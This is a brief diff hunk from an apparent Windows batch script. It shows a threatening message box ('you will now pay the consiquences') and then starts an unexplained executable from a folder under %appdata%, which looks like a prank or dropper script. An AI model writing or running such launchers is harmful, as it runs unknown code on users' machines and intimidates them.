@@ -110,4 +110,3 @@ ping localhost -n 2 >nul
 cscript %appdata%\willishot\MessageBox.vbs "you will now pay the consiquences" >nul
 timeout 2 >nul
 start %appdata%\willishot\willvar.exe
-taskkill C:\Windows\System32\cmd.exe >nul
